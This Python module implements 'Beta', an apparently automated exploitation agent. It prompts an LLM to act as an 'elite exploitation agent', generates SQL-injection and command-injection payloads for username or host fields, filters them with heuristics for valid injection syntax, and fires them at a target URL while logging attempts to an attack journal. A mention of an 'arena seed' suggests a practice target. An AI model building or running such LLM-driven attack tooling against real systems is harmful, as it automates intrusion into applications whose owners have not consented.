import re
from typing import Any, Awaitable, Callable

from journal import AttackJournal
from llm import groq_complete
from target_intel import get_attack_surface, get_seed_payload
from tools.http_exploit import fire_payload, summarize_response

BroadcastFn = Callable[[str, str, str], Awaitable[None]]


def _clean_payload(raw: str, vuln_type: str) -> str:
    payload = raw.strip()
    if payload.startswith("```"):
        lines = payload.splitlines()
        payload = "\n".join(lines[1:-1] if len(lines) > 2 else lines).strip()

    for quote in ('"""', "'''", '"', "'"):
        if len(payload) >= 2 and payload.startswith(quote) and payload.endswith(quote):
            payload = payload[len(quote) : -len(quote)].strip()

    lowered = payload.lower()
    for prefix in (
        "username=",
        "user=",
        "password=",
        "host=",
        "login=",
        "payload=",
    ):
        if lowered.startswith(prefix):
            payload = payload[len(prefix) :].strip()
            lowered = payload.lower()

    # Strip mistaken id=1 / id= prefixes from generic SQLi blogs
    id_match = re.match(r"^id\s*=\s*\d*(.*)$", payload, re.IGNORECASE | re.DOTALL)
    if id_match and vuln_type == "sqli":
        rest = id_match.group(1).strip()
        if rest:
            payload = rest

    return payload.strip()


def _looks_off_target(payload: str, vuln_type: str) -> bool:
    if not payload:
        return True
    lowered = payload.lower()
    if vuln_type == "sqli":
        if lowered.startswith("id=") or "union/**/" in lowered.replace(" ", ""):
            return True
        if "sleep(" in lowered or "substring(" in lowered:
            return True
        if "'" not in payload and "or" not in lowered:
            return True
    if vuln_type == "cmdi":
        if lowered.startswith("id=") or "select " in lowered:
            return True
        if "&" not in payload and "|" not in payload and ";" not in payload:
            return True
    return False


async def run_beta(
    target_url: str,
    vuln_type: str,
    alpha_results: list[str],
    journal: AttackJournal,
    broadcast_fn: BroadcastFn,
    attempt: int = 1,
) -> dict[str, Any]:
    intel = "\n".join(alpha_results[:15]) if alpha_results else "No recon results."
    surface = get_attack_surface(vuln_type, target_url)
    seed = get_seed_payload(vuln_type, attempt)

    system_prompt = (
        "You are Beta, an elite exploitation agent.\n"
        f"{surface}\n"
        "ATTACK JOURNAL (everything tried so far — do NOT repeat any of these):\n"
        f"{journal.get_context_string()}\n"
        "Your task: Generate exactly ONE new payload value to inject (username or host "
        "field only — never include JSON keys, field names, or id= prefixes). "
        "It must differ from all failed journal entries. "
        "Output ONLY the raw payload string — no quotes, no explanation."
    )
    user_prompt = (
        f"Attempt number: {attempt}\n"
        f"Recon intelligence:\n{intel}\n\n"
        f"If unsure, adapt this seed for this attempt: {seed}"
    )

    raw_payload = await groq_complete(system_prompt, user_prompt)
    payload = _clean_payload(raw_payload, vuln_type)

    if _looks_off_target(payload, vuln_type):
        await broadcast_fn(
            f"Beta: LLM payload off-target, using arena seed for attempt {attempt}",
            "BETA",
            "info",
        )
        payload = seed

    await broadcast_fn(f"Beta: Firing payload → {payload}", "BETA", "thinking")

    response = await fire_payload(target_url, vuln_type, payload, broadcast_fn)

    await broadcast_fn(
        f"Beta: Response received — Status {response.get('status_code', 0)}",
        "BETA",
        "info",
    )

    return {"payload": payload, "response": response}
